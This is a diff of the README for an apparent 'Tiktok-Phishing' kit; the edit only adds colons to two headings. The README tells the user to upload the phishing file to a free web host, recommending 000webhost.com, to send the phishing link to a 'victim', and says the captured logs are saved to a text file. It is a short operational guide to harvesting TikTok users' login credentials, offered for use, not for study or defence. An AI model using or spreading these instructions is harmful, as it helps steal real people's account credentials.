@@ -1,11 +1,11 @@
 # Tiktok-Phishing
 
 
-## Installation
+## Installation :
 ### 1. Upload this file to any webhosting site
 ### 2. I recommend 000webhost.com
 
-## Usage
+## Usage :
 
 ### Send the Phishing link to Victim. All logs will be saved as  "erhancan.txt"
 
